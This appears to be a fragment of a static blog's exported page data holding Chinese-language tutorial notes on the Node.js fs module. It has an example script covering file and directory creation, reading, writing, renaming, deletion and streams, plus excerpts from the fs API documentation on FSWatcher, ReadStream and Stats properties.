class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* </span><br><span class=\"line\"> 1. fs.stat  检测是文件还是目录(目录 文件是否存在) </span><br><span class=\"line\"> 2. fs.mkdir  创建目录 （创建之前先判断是否存在） </span><br><span class=\"line\"> 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) </span><br><span class=\"line\"> 4. fs.appendFile 写入追加文件 </span><br><span class=\"line\"> 5. fs.readFile 读取文件 </span><br><span class=\"line\"> 6. fs.readdir 读取目录 </span><br><span class=\"line\"> 7. fs.rename 重命名 </span><br><span class=\"line\"> 8. fs.rmdir  删除目录 </span><br><span class=\"line\"> 9. fs.unlink 删除文件 </span><br><span class=\"line\"> 10. fs.createReadStream(&apos;&apos;) 从文件流中读取数据</span><br><span class=\"line\"> 11. fs.createWriteStream  写入文件流</span><br><span class=\"line\"> 12. pipe 管道流 </span><br><span class=\"line\"> 13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">*/</span><br><span class=\"line\"> </span><br><span class=\"line\">var fs=require(&apos;fs&apos;);   //fs是node.js的核心模块，不用下载安装，可以直接引入  </span><br><span class=\"line\"> </span><br><span class=\"line\">//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。</span><br><span class=\"line\">fs.stat(&apos;html&apos;,function(error,stats)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;文件：&apos;+stats.isFile());</span><br><span class=\"line\">    console.log(&apos;目录：&apos;+stats.isDirectory());</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//2. fs.mkdir  创建目录  </span><br><span class=\"line\">fs.mkdir(&apos;css&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;创建目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  </span><br><span class=\"line\">fs.writeFile(&apos;123.txt&apos;,&apos;你好nodejs 覆盖&apos;,&apos;utf8&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//4. fs.appendFile 追加文件  </span><br><span class=\"line\">fs.appendFile(&apos;123.txt&apos;,&apos;这是写入的内容\\n&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//5.fs.readFile 读取文件  </span><br><span class=\"line\">fs.readFile(&apos;123.txt&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式&quot;utf8&quot;来解决十六进制的问题;</span><br><span class=\"line\">    console.log(data.toString());  //读取出所有行的信息  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  </span><br><span class=\"line\">fs.readdir(&apos;html&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  </span><br><span class=\"line\">fs.rename(&apos;html/index.html&apos;,&apos;html/news.html&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;修改名字成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  </span><br><span class=\"line\">fs.rmdir(&apos;abc目录&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//9. fs.unlink删除文件  </span><br><span class=\"line\">fs.unlink(&apos;index.txt&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除文件成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  </span><br><span class=\"line\">var fileReadStream = fs.createReadStream( &apos;data1.json&apos;);</span><br><span class=\"line\">var str = &apos;&apos;;</span><br><span class=\"line\">fileReadStream.on(&apos;data&apos;, (data) =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot;接收到&quot; + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  </span><br><span class=\"line\">str += data;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;end&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot; --- 结束 ---&quot;);</span><br><span class=\"line\">console.log( str );</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;error&apos;, (error) =&gt; &#123;</span><br><span class=\"line\">    console.log(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//11. fs.createWriteStream  写入文件流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var data  = &quot;我是从数据库获取的数据，我要保存起来&quot;;</span><br><span class=\"line\">var writerStream = fs.createWriteStream(&apos;output.txt&apos;);</span><br><span class=\"line\">writerStream.write( data , &apos;UTF8&apos; );</span><br><span class=\"line\">writerStream.end();  //标记文件末尾  结束写入流，释放资源  </span><br><span class=\"line\">writerStream.on( &apos;finish&apos;,  function() &#123;</span><br><span class=\"line\">    console.log(&quot;写入完成。&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">writerStream.on( &apos;error&apos;,  function(error)&#123;</span><br><span class=\"line\">    console.log(error.stack);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//12. pipe 管道流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var readerStream = fs.createReadStream( &apos;input.txt&apos;);</span><br><span class=\"line\">var writerStream = fs.createWriteStream( &apos;output.txt&apos;);</span><br><span class=\"line\">readerStream.pipe( writerStream );</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">var  fs = require(&apos;fs&apos;);</span><br><span class=\"line\">fs.access(&apos;package.json&apos;,(err)=&gt;&#123;</span><br><span class=\"line\">    console.log(err ?  &apos;目录/文件不存在&apos;: &apos;文件存在,可以进行读写&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"FS-文件系统\"><a href=\"#FS-文件系统\" class=\"headerlink\" title=\"FS-文件系统\"></a><a href=\"http://nodejs.cn/api/fs.html#fs_file_system\" target=\"_blank\" rel=\"noopener\">FS-文件系统</a></h2><p>fs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。</p>\n<p><strong>所有的文件系统操作都有异步和同步两种形式。</strong></p>\n<p><code>异步</code>形式的 <strong>最后一个<code>参数</code>都是完成时<code>回调函数</code></strong>。 传给回调函数的参数取决于具体方法，但<code>回调函数的第一个参数都会保留给异常</code>。 如果操作成功完成，则第一个参数会是 null 或 undefined。</p>\n<p><strong>同步操作</strong></p>\n<p>当使用<code>同步操作</code>时，任何异常都会被立即抛出，可以使用 <code>try/catch</code> 来处理异常，或让异常向上冒泡。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs = require(&apos;fs&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">  fs.unlinkSync(&apos;/tmp/hello&apos;);</span><br><span class=\"line\">  console.log(&apos;successfully deleted /tmp/hello&apos;);</span><br><span class=\"line\">&#125; catch (err) &#123;</span><br><span class=\"line\">  // handle the error</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>异步操作</strong></p>\n<p>注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。</p>\n<p><strong>建议</strong></p>\n<p>在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。</p>\n<h3 id=\"文件路径\"><a href=\"#文件路径\" class=\"headerlink\" title=\"文件路径\"></a>文件路径</h3><p>大部分 <code>fs</code> 操作接受<code>字符串</code>、<code>Buffer</code>、或使用 <code>file:</code> 协议的 <code>URL</code> 对象作为文件路径。</p>\n<p><code>相对路径</code> 会相对于 <code>process.cwd()</code> 定义的当前工作目录进行处理。</p>\n<p>使用 <code>Buffer</code> 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。</p>\n<p><strong>注意</strong> 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync(‘c:\\‘) 可能会返回与 fs.readdirSync(‘c:’) 不同的结果。 详见 <a href=\"\">MSDN路径文档</a></p>\n<h4 id=\"支持-URL-对象\"><a href=\"#支持-URL-对象\" class=\"headerlink\" title=\"支持 URL 对象\"></a>支持 URL 对象</h4><h3 id=\"文件描述符\"><a href=\"#文件描述符\" class=\"headerlink\" title=\"文件描述符\"></a><strong>文件描述符</strong></h3><p>在 <code>POSIX</code> 系统，<code>内核</code>为<code>所有进程</code>维护着一张当前打开着的<code>文件与资源表格</code>。 每个打开的文件都会分配一个名为<code>文件描述符</code>的数值标识。</p>\n<p>在<code>系统层</code>，所有<code>文件系统操作</code>使用这些<code>文件描述符</code>来识别与追踪每个特定的文件。 </p>\n<p>Window 系统使用了一个<code>不同但概念类似</code>的机制来追踪资源。 </p>\n<p>为方便用户，<code>Node.js 抽象了不同操作系统间的差异</code>，为所有打开的文件分配了数值的文件描述符。</p>\n<p><code>fs.open()</code> 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于<code>读取</code>数据、<code>写入</code>数据、或<code>查看</code>文件信息。</p>\n<p><code>大多数操作系统</code>会<code>限制打开的文件描述符的数量</code>，所以当<code>操作完成时需关闭描述符</code>。 如果不这样做会导致<code>内存泄漏</code>，最终造成应用奔溃。</p>\n<h3 id=\"线程池的使用\"><a href=\"#线程池的使用\" class=\"headerlink\" title=\"线程池的使用\"></a>线程池的使用</h3><p>注意，所有文件系统 API 中，除了 <code>fs.FSWatcher()</code> 和那些显式同步的方法之外，都使用了 <code>libuv</code> 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 <a href=\"http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size\" target=\"_blank\" rel=\"noopener\"><code>UV_THREADPOOL_SIZE</code></a> 文档。</p>\n<h1 id=\"fs-FSWatcher-类\"><a href=\"#fs-FSWatcher-类\" class=\"headerlink\" title=\"fs.FSWatcher 类\"></a>fs.FSWatcher 类</h1><p>成功调用 <code>fs.watch()</code> 方法会返回一个新的 <code>fs.FSWatcher</code> 对象。</p>\n<p>所有 <code>fs.FSWatcher</code> 对象都是 <a href=\"http://nodejs.cn/api/events.html\" target=\"_blank\" rel=\"noopener\"><code>EventEmitter</code></a> 的，每当监视的文件被修改时会触发 <code>&#39;change&#39;</code> 事件。</p>\n<h2 id=\"‘change’-事件\"><a href=\"#‘change’-事件\" class=\"headerlink\" title=\"‘change’ 事件\"></a>‘change’ 事件</h2><ul>\n<li><code>eventType</code> \\<string> 发生的变化事件的类型。</string></li>\n<li><code>filename</code> \\<string> | \\<buffer> 变化的文件名（如果是相关的或有效的）。</buffer></string></li>\n</ul>\n<p>当被监视的目录或文件有变化时触发。 详见 <code>fs.watch()</code></p>\n<h2 id=\"‘close’-事件\"><a href=\"#‘close’-事件\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>watcher</code> 停止监视文件变化时触发。 关闭的 <code>fs.FSWatcher</code> 对象在事件处理函数中不再可用。</p>\n<h2 id=\"‘error’-事件\"><a href=\"#‘error’-事件\" class=\"headerlink\" title=\"‘error’ 事件\"></a>‘error’ 事件</h2><p>当监视文件发生错误时触发。 </p>\n<p>发生错误的 <code>fs.FSWatcher</code> 对象在事件处理函数中<code>不再可用</code>。</p>\n<h2 id=\"watcher-close\"><a href=\"#watcher-close\" class=\"headerlink\" title=\"watcher.close()\"></a>watcher.close()</h2><p><code>fs.FSWatcher</code> <code>停止监视</code>文件的变化。 </p>\n<p>一旦停止，<code>fs.FSWatcher</code> 对象将<code>不再可用</code>。</p>\n<h1 id=\"fs-ReadStream-类\"><a href=\"#fs-ReadStream-类\" class=\"headerlink\" title=\"fs.ReadStream 类\"></a>fs.ReadStream 类</h1><p>成功调用 <code>fs.createReadStream()</code> 会返回一个新的 <code>fs.ReadStream</code> 对象。</p>\n<p><code>fs.ReadStream</code> 对象都是可读流。</p>\n<h2 id=\"‘close’-事件-1\"><a href=\"#‘close’-事件-1\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>fs.ReadStream</code> 底层的文件描述符被关闭时触发。</p>\n<h2 id=\"‘open’-事件\"><a href=\"#‘open’-事件\" class=\"headerlink\" title=\"‘open’ 事件\"></a>‘open’ 事件</h2><h2 id=\"‘ready’-事件\"><a href=\"#‘ready’-事件\" class=\"headerlink\" title=\"‘ready’ 事件\"></a>‘ready’ 事件</h2><h2 id=\"readStream-bytesRead\"><a href=\"#readStream-bytesRead\" class=\"headerlink\" title=\"readStream.bytesRead\"></a>readStream.bytesRead</h2><p>已读取的字节数。</p>\n<h2 id=\"readStream-path\"><a href=\"#readStream-path\" class=\"headerlink\" title=\"readStream.path\"></a>readStream.path</h2><h1 id=\"fs-Stats-类\"><a href=\"#fs-Stats-类\" class=\"headerlink\" title=\"fs.Stats 类\"></a>fs.Stats 类</h1><p><code>fs.Stats</code> 对象提供了一个文件的信息。</p>\n<h2 id=\"stats-isBlockDevice\"><a href=\"#stats-isBlockDevice\" class=\"headerlink\" title=\"stats.isBlockDevice()\"></a>stats.isBlockDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个块设备，则返回 true 。</p>\n<h2 id=\"stats-isCharacterDevice\"><a href=\"#stats-isCharacterDevice\" class=\"headerlink\" title=\"stats.isCharacterDevice()\"></a>stats.isCharacterDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个字符设备，则返回 true 。</p>\n<h2 id=\"stats-isDirectory\"><a href=\"#stats-isDirectory\" class=\"headerlink\" title=\"stats.isDirectory()\"></a>stats.isDirectory()</h2><p>如果 <code>fs.Stats</code> 对象表示一个文件系统目录，则返回 true 。</p>\n<h2 id=\"stats-isFIFO\"><a href=\"#stats-isFIFO\" class=\"headerlink\" title=\"stats.isFIFO()\"></a>stats.isFIFO()</h2><p>如果 <code>fs.Stats</code> 对象表示一个<code>先进先出 (FIFO) 管道</code>，则返回 true 。</p>\n<p>FIFO( First Input First Output)简单说就是指先进先出。<a href=\"https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin\" target=\"_blank\" rel=\"noopener\">百度百科: FIFO存储器</a></p>\n<h2 id=\"stats-isFile\"><a href=\"#stats-isFile\" class=\"headerlink\" title=\"stats.isFile()\"></a>stats.isFile()</h2><p>如果 <code>fs.Stats</code> 对象表示一个普通文件，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSocket\"><a href=\"#stats-isSocket\" class=\"headerlink\" title=\"stats.isSocket()\"></a>stats.isSocket()</h2><p>如果 <code>fs.Stats</code> 对象表示一个 <code>socket</code>，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSymbolicLink\"><a href=\"#stats-isSymbolicLink\" class=\"headerlink\" title=\"stats.isSymbolicLink()\"></a>stats.isSymbolicLink()</h2><p>如果 <code>fs.Stats</code> 对象表示一个符号链接，则返回 <code>true</code> 。</p>\n<p>该方法只在使用 <code>fs.lstat()</code> 时有效。</p>\n<h2 id=\"stats属性\"><a href=\"#stats属性\" class=\"headerlink\" title=\"stats属性\"></a>stats属性</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">type</th>\n<th style=\"text-align:left\">description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">stats.dev</td>\n<td style=\"text-align:left\">包含文件的设备的数值型标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ino</td>\n<td style=\"text-align:left\">文件系统特定的文件索引节点数值。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mode</td>\n<td style=\"text-align:left\">表示文件类型与模式的位域。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.nlink</td>\n<td style=\"text-align:left\">文件的硬链接数量。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.uid</td>\n<td style=\"text-align:left\">文件拥有者的数值型用户标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.gid</td>\n<td style=\"text-align:left\">拥有文件的群组的数值型群组标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.rdev</td>\n<td style=\"text-align:left\">如果文件是一个特殊文件，则返回数值型的设备标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.size</td>\n<td style=\"text-align:left\">文件的字节大小。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.blksize</td>\n<td style=\"text-align:left\">文件系统用于 I/O 操作的块大小。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.blocks</td>\n<td style=\"text-align:left\">分配给文件的块的数量。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.atimeMs</td>\n<td style=\"text-align:left\">表示文件最后一次被<code>访问</code>的时间戳。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mtimeMs</td>\n<td style=\"text-align:left\">表示文件最后一次被<code>修改</code>的时间戳。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ctimeMs</td>\n<td style=\"text-align:left\">表示文件<code>状态最后一次被改变</code>的时间戳。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.birthtimeMs</td>\n<td style=\"text-align:left\">表示文件的<code>创建时间戳</code>。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.atime</td>\n<td style=\"text-align:left\">表示文件<code>最后一次被访问</code>的时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mtime</td>\n<td style=\"text-align:left\">表示文件<code>最后一次被修改</code>的时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ctime</td>\n<td style=\"text-align:left\">表示文件<code>状态最后一次被改变</code>的时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.birthtime</td>\n<td style=\"text-align:left\">表示文件的<code>创建</code>时间。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Stat-时间的值\"><a href=\"#Stat-时间的值\" class=\"headerlink\" title=\"Stat 时间的值\"></a>Stat 时间的值</h2><p>略</p>\n<h1 id=\"fs-WriteStream-类\"><a href=\"#fs-WriteStream-类\" class=\"headerlink\" title=\"fs.WriteStream 类\"></a>fs.WriteStream 类</h1>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\"><a href=\"#Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\" class=\"headerlink\" title=\"Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流\"></a><a href=\"https://blog.csdn.net/houyanhua1/article/details/79443987\" target=\"_blank\" rel=\"noopener\">Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* </span><br><span class=\"line\"> 1. fs.stat  检测是文件还是目录(目录 文件是否存在) </span><br><span class=\"line\"> 2. fs.mkdir  创建目录 （创建之前先判断是否存在） </span><br><span class=\"line\"> 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) </span><br><span class=\"line\"> 4. fs.appendFile 写入追加文件 </span><br><span class=\"line\"> 5. fs.readFile 读取文件 </span><br><span class=\"line\"> 6. fs.readdir 读取目录 </span><br><span class=\"line\"> 7. fs.rename 重命名 </span><br><span class=\"line\"> 8. fs.rmdir  删除目录 </span><br><span class=\"line\"> 9. fs.unlink 删除文件 </span><br><span class=\"line\"> 10. fs.createReadStream(&apos;&apos;) 从文件流中读取数据</span><br><span class=\"line\"> 11. fs.createWriteStream  写入文件流</span><br><span class=\"line\"> 12. pipe 管道流 </span><br><span class=\"line\"> 13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">*/</span><br><span class=\"line\"> </span><br><span class=\"line\">var fs=require(&apos;fs&apos;);   //fs是node.js的核心模块，不用下载安装，可以直接引入  </span><br><span class=\"line\"> </span><br><span class=\"line\">//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。</span><br><span class=\"line\">fs.stat(&apos;html&apos;,function(error,stats)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;文件：&apos;+stats.isFile());</span><br><span class=\"line\">    console.log(&apos;目录：&apos;+stats.isDirectory());</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//2. fs.mkdir  创建目录  </span><br><span class=\"line\">fs.mkdir(&apos;css&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;创建目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  </span><br><span class=\"line\">fs.writeFile(&apos;123.txt&apos;,&apos;你好nodejs 覆盖&apos;,&apos;utf8&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//4. fs.appendFile 追加文件  </span><br><span class=\"line\">fs.appendFile(&apos;123.txt&apos;,&apos;这是写入的内容\\n&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        